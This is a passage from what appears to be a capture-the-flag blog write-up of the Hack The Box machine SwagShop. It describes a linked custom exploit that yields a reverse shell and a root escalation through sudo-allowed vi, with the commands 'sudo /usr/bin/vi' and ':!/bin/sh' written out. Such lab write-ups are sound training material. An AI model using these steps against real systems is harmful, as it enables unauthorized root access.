+<p><a href="/assets/hackthebox/swagshop/swagshop-06-9eb3f6484b9d2d7097ed724d8462f76c1fceabf00dc610b630b95a44e464b83a.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-06-9eb3f6484b9d2d7097ed724d8462f76c1fceabf00dc610b630b95a44e464b83a.png" alt="SwagShop Exploit" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-06-9eb3f6484b9d2d7097ed724d8462f76c1fceabf00dc610b630b95a44e464b83a.png" data-zooming-width="426" data-zooming-height="93" />
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that assemble both exploits, it creates the admin user using the first exploit, inject a Python RCE stager using the second exploit and give us an interactive reverse shell!
+It’s available on my GitHub xD</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/swagshop" target="_blank">SwagShop Exploit</a></p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-07-698e7396bbe12a548dde7d221eb4963ad9cdb8b57af98b64659dac81d99e014e.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-07-698e7396bbe12a548dde7d221eb4963ad9cdb8b57af98b64659dac81d99e014e.png" alt="SwagShop Exploit" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-07-698e7396bbe12a548dde7d221eb4963ad9cdb8b57af98b64659dac81d99e014e.png" data-zooming-width="894" data-zooming-height="367" />
+</a></p>
+
+<h1 id="post-exploitation---exploiting-misconfigured-permissions-to-editors">Post Exploitation - Exploiting misconfigured permissions to editors</h1>
+
+<p>With a simple <code class="highlighter-rouge">sudo -l</code> we can see that there’s an editor named <code class="highlighter-rouge">vi</code>, this binary can ben executed as root by any user:</p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-08-a2803fb13baf8ff8c24339de2e7d0f7e3cde1e4362d5bb4b45ddbc917ab237a4.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-08-a2803fb13baf8ff8c24339de2e7d0f7e3cde1e4362d5bb4b45ddbc917ab237a4.png" alt="SwagShop Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-08-a2803fb13baf8ff8c24339de2e7d0f7e3cde1e4362d5bb4b45ddbc917ab237a4.png" data-zooming-width="654" data-zooming-height="124" />
+</a></p>
+
+<p>It’s possible to escalate our privileges exploiting this, there’s a vi function that’s spawn a shell session.</p>
+
+<p>We simple create a new file with vi:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">sudo</span> /usr/bin/vi /var/www/html/nullarmor</code></pre></figure>
+
+<p>and then spawn the shell:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">:!/bin/sh</code></pre></figure>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-09-858a8ef25e5fc53e077c7e7b63556a5359fe7af4455cf8504b1d7f6963e5a7a2.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-09-858a8ef25e5fc53e077c7e7b63556a5359fe7af4455cf8504b1d7f6963e5a7a2.png" alt="SwagShop Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-09-858a8ef25e5fc53e077c7e7b63556a5359fe7af4455cf8504b1d7f6963e5a7a2.png" data-zooming-width="415" data-zooming-height="303" />
+</a></p>
+
+<p>and finally capturing the last flag!</p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=SwagShop+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/swagshop%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/swagshop" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
